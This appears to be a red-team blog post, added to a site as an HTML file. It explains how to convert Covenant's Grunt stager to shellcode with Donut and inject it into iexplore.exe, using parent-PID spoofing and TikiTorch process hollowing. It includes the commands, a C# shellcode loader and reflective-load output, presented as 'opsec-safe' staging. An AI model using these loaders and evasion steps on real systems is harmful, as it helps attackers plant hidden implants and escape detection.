@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="your description">
+    <meta name="Author" content="Rasta Mouse">
+    <meta name="keywords" content="offensive security">
+    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
+    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>Cheesy Rumbles</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        
+    
+
+    <a id="branding" href=https://rastamouse.me>
+        
+            Cheesy Rumbles
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>home</span>
+            </a>
+        
+            		
+            <a href="/blog/"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>blog</span>
+            </a>
+        
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
+        
+            		
+            <a href="https://twitter.com/_RastaMouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-twitter fa-ms"></i>
+                <span>twitter</span>
+            </a>
+        
+            		
+            <a href="https://github.com/rasta-mouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">Covenant, Donut, TikiTorch</h1>
+    
+      
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#donut">Donut</a></li>
+    <li><a href="#injection-test">Injection Test</a></li>
+    <li><a href="#tikitorch">TikiTorch</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    <p>Covenant <a href="https://github.com/cobbr/Covenant/commit/bde0df315f26b01a4ef5c5c00679b1e150998a35">v0.1</a> was first released in February 2019 and has since received a lot of really good updates.  <a href="https://github.com/cobbr/Covenant/commit/a2df643e01aea3ad7330bdba88ddd560692e46b4">v0.2</a> was released in May which added p2p comms over SMB named pipes, and <a href="https://github.com/cobbr/Covenant/commit/abcba78006c29b687f6e1a43a1ea1793784714fd">v0.3</a> was released in August which added a brand new web interface.  Even though it&rsquo;s such a young project, it has really proven itself to be a capable tool for offensive operators.  I&rsquo;ve not taken a look at Covenant since v0.1.x but since providing some new <a href="https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Persistence/WMI.cs">additions</a> to SharpSploit, it kinda got my geek going.  One of my areas of interest is weaponising the Grunt stager.</p>
+<p>At the time of writing, Covenant has 9 Launchers.</p>
+<figure>
+    <img src="/images/covenant-payloads/launchers.png"/> 
+</figure>
+
+<p>The reason these exist is fairly obvious if you&rsquo;ve been working with C# tooling for any length of time.  The <a href="https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs">Grunt Stager</a> is a C# application that compiles to a .NET Framework binary.  These Launchers represent several methods that we&rsquo;ve become accustomed to using, to execute C#/.NET tooling in &ldquo;interesting&rdquo; ways.</p>
+<p>Coming from a Cobalt Strike (and even a Metasploit Framework) background, the most notable &ldquo;feature&rdquo; missing here is shellcode.  There is no Grunt shellcode, and without this, doing any sort of fancy process injection is kinda hard.</p>
+<h2 id="donut">Donut</h2>
+<p>TheWover and Odzhan changed the landscape somewhat by releasing <a href="https://github.com/TheWover/donut">Donut</a>.</p>
+<blockquote>
+<p>Donut is a shellcode generation tool that creates position-independant shellcode payloads from .NET Assemblies.  This shellcode may be used to inject the Assembly into arbitrary Windows processes.</p>
+</blockquote>
+<p>So this allows us to take a compiled Grunt Stager (i.e. GruntStager.exe) and turn it into PIC that we can use with various process injection techniques.  It also has some other interesting features such as a modular AMSI bypass system (for .NET 4.8+).</p>
+<h2 id="injection-test">Injection Test</h2>
+<p>A cool (imo) method of process injection is to create a new process in a suspended state, allocate a new region of ReadWrite memory in that process, copy the desired shellcode across, change the memory protection to ReadExecute and finally create a new thread that runs in the virtual address space of that shellcode.</p>
+<p>To obtain <code>GruntStager.exe</code>, simply create a listener and use the <code>Binary Launcher</code>.  Then use donut to create the PIC.</p>
+<pre><code>C:\Users\Daniel&gt;D:\Tools\donut\donut.exe -f Downloads\GruntStager.exe -o D:\Tools\GruntStager.bin
+</code></pre><p>Base64 encode <code>GruntStager.bin</code> with <code>[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(&quot;D:\Tools\GruntStager.bin&quot;)) | clip</code>, and paste onto line 16 of the following gist:</p>
+<!-- raw HTML omitted -->
+<p>This is 64-bit shellcode, so ensure the above is compiled as a 64-bit binary.</p>
+<p>Now we can run it, providing a process to inject into and the PPID to spoof.  In this example, we&rsquo;re using <code>iexplore.exe</code> PPID&rsquo;d to Explorer.</p>
+<p><code>C:\Users\user1\Desktop&gt;GruntInjector.exe &quot;C:\Program Files\Internet Explorer\iexplore.exe&quot; 4084</code></p>
+<p><figure>
+    <img src="/images/covenant-payloads/grunt_iexplore.png"/> 
+</figure>
+
+<figure>
+    <img src="/images/covenant-payloads/iexplore_process-hacker.png"/> 
+</figure>
+</p>
+<hr>
+<h2 id="tikitorch">TikiTorch</h2>
+<p>We can even use this shellcode with TikiTorch and it&rsquo;s Process Hollowing capabilities.</p>
+<p><code>PS C:\Users\Daniel&gt; Get-CompressedShellcode -inFile D:\Tools\GruntStager.bin -outFile D:\Tools\TikiGruntStager.txt</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
+
+<span class="k">using</span> <span class="nn">TikiLoader</span><span class="p">;</span>
+
+<span class="k">public</span> <span class="k">class</span> <span class="nc">TikiSpawn</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="k">static</span> <span class="kt">int</span> <span class="n">FindProcessPid</span><span class="p">(</span><span class="kt">string</span> <span class="n">process</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kt">int</span> <span class="n">pid</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
+        <span class="kt">int</span> <span class="n">session</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="n">GetCurrentProcess</span><span class="p">().</span><span class="n">SessionId</span><span class="p">;</span>
+        <span class="n">Process</span><span class="p">[]</span> <span class="n">processes</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="n">GetProcessesByName</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+
+        <span class="k">foreach</span> <span class="p">(</span><span class="n">Process</span> <span class="n">proc</span> <span class="k">in</span> <span class="n">processes</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="n">SessionId</span> <span class="p">==</span> <span class="n">session</span><span class="p">)</span>
+                <span class="n">pid</span> <span class="p">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">Id</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
+
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="n">Flame</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="kt">string</span> <span class="n">binary</span> <span class="p">=</span> <span class="s">@&#34;C:\Program Files\Internet Explorer\iexplore.exe&#34;</span><span class="p">;</span>
+        <span class="kt">byte</span><span class="p">[]</span> <span class="n">shellcode</span> <span class="p">=</span> <span class="n">Loader</span><span class="p">.</span><span class="n">DecompressShellcode</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s">&#34;H4sI[...snip...]nwAA&#34;</span><span class="p">));</span>
+        <span class="kt">int</span> <span class="n">ppid</span> <span class="p">=</span> <span class="n">FindProcessPid</span><span class="p">(</span><span class="s">&#34;explorer&#34;</span><span class="p">);</span>
+
+        <span class="k">try</span>
+        <span class="p">{</span>
+            <span class="kt">var</span> <span class="n">ldr</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Loader</span><span class="p">();</span>
+            <span class="n">ldr</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">ppid</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">catch</span> <span class="p">{</span>
+            <span class="c1">// pokemon
+</span><span class="c1"></span>        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><pre><code>PS C:\Users\user1&gt; $TikiSpawn = [System.IO.File]::ReadAllBytes(&quot;C:\Users\user1\Desktop\TikiSpawn.dll&quot;)
+PS C:\Users\user1&gt; [System.Reflection.Assembly]::Load($TikiSpawn)
+
+GAC    Version        Location
+---    -------        --------
+False  v4.0.30319
+
+
+PS C:\Users\user1&gt; [TikiSpawn]::Flame()
+</code></pre><p><figure>
+    <img src="/images/covenant-payloads/grunt_iexplore_tikispawn.png"/> 
+</figure>
+
+<figure>
+    <img src="/images/covenant-payloads/iexplore_process-hacker_tikispawn.png"/> 
+</figure>
+</p>
+<hr>
+<h2 id="conclusion">Conclusion</h2>
+<p>What I&rsquo;ve shown here is not meant to replace any of the existing Launchers, but the techniques can lend extra flexibility when staging Grunts.  For example, the default PowerShell Launcher stages a Grunt in <code>powershell.exe</code> with the following process tree.</p>
+<figure>
+    <img src="/images/covenant-payloads/default_powershell_launcher.png"/> 
+</figure>
+
+<p>Where, as we&rsquo;ve seen above, process injection techniques with PIC allows us to be more opsec-safe (in some areas).  And if donut (or something like it) were to be integrated into Covenant, we&rsquo;d be able to easily make additional post-exploitation Tasks such as injecting Grunts into other users&rsquo; process, and more opsec-safe lateral movement.</p>
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://rastamouse.me/blog/tikigressor/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a href="https://rastamouse.me/blog/tikiservice/"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+
+<p class="copyright meta">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=https://rastamouse.me/js/navbutton.js></script>
+</html>
